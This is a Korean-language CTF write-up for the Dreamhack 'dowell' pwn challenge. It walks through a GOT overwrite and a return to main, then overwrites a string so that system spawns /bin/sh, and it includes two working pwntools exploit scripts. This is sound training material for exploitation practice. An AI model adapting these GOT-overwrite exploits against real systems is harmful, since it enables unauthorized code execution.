# Level2:dowell

## 문제 링크

---

https://dreamhack.io/wargame/challenges/1568

## Description

---

**We all do well to get shell!**

## Environment

---

![스크린샷 2025-02-07 오후 2.38.37.png](Level2%20dowell%20e7408c5187eb4c3680bee68c35b8aab0/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-07_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.38.37.png)

## Background

---

- GOT Overwrite

## 코드 분석

---

### IDA

- IDA를 이용하여 디컴파일한 코드이다.

![스크린샷 2025-02-07 오후 2.41.10.png](Level2%20dowell%20e7408c5187eb4c3680bee68c35b8aab0/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-07_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.41.10.png)

- 첫 번째 `scanf` 에서 `s` 의 값을 변경할 수 있다.
- 두 번째 `scanf` 에서 `s` 가 가리키는 영역에 값을 대입할 수 있다.
- 임의 주소 쓰기가 가능하다.

## 익스플로잇

---

### 익스플로잇 단계 #1

- 문제를 처음 보았을 때 했던 생각은 `puts_got` 를 `one_gadget` 으로 덮어 씌워 쉘을 획득하는 방법이었다.
    - Partial RERLO → GOT Overwrite 가능
    - No PIE → `libc_base` 를 구할 필요 없이 `one_gadget` 사용 가능
- `IBT` 가 활성화 되어있어 실패하였다.
    - `IBT` (Indirect Branch Tracking) : 간접 호출이 신뢰된 타겟으로만 이동할 수 있는 보호 기법
    - `one_gadget` 은 신뢰되지 않은 타겟이라 이동이 불가하다.

### 익스플로잇 단계 #2

- `prob` 를 실행하면 “I do well at getting the flag” 이라는 문자열이 출력된다.
- 해당 부분은 `system(st)` 에 의해 출력되는 부분이다.

![스크린샷 2025-02-07 오후 2.48.44.png](Level2%20dowell%20e7408c5187eb4c3680bee68c35b8aab0/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-07_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.48.44.png)

![스크린샷 2025-02-07 오후 2.50.42.png](Level2%20dowell%20e7408c5187eb4c3680bee68c35b8aab0/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-07_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.50.42.png)

- 따라서 `st` 문자열의 값을 바꿀 수 있으면, `system(/bin/sh)` 으로 쉘을 획득할 수 있다.
- GOT Overwrite가 가능하므로, `puts_got` 를 `main` 으로 설정하면 Ret2main이 가능하다.

### exploit.py

- Ret2main으로 입력을 여러번 받을 수 있게 하였다.
- `st` 를 덮어 씌워 `system(/bin/sh)` 를 수행하게 한다.

```purescript
from pwn import *

context.log_level = 'debug'

e = ELF('./prob')
# p = e.process()
p = remote('host1.dreamhack.games', 15384)

# GOT overwrite to Ret2main
p.sendlineafter(b'pt: ', str(e.got['puts']))
p.sendlineafter(b'input: ', p64(e.symbols['main']))

# system(/bin/sh)
p.sendlineafter(b'pt: ', str(e.symbols['st']))
p.sendlineafter(b'input: ', b'/bin/sh')

p.interactive()
```

![스크린샷 2025-02-07 오후 2.57.34.png](Level2%20dowell%20e7408c5187eb4c3680bee68c35b8aab0/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-07_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_2.57.34.png)

- `puts(s[0])` 임을 이용하여 `puts_got - 0x8` 에 `/bin/sh` 을, `puts_got` 에 `system_plt` 를 Overwrite하여 익스플로잇 하는 방법도 존재했다…;

```purescript
from pwn import *
p = remote("host3.dreamhack.games", 24067)
# p = process("./prob")
e = ELF("./prob") 

p.sendline(str(e.got['puts']-8).encode())
p.sendline(b"/bin/sh;"+p64(e.plt['system']))

p.interactive()
```